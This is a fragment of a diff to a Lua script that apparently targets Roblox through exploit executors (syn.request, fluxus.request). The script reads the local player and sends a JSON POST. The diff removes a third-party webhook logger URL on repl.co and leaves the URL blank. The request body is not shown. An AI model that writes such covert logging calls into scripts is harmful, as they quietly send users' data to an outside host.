@@ -4,7 +4,7 @@ local player = Players.LocalPlayer
 local requestFunc = (http_request or request or syn and syn.request or fluxus and fluxus.request)
 
 requestFunc({
-    Url = "https://webhookagain.meunomeefldanev.repl.co/log",
+    Url = "",
     Method = "POST",
     Headers = {
         ["Content-Type"] = "application/json"
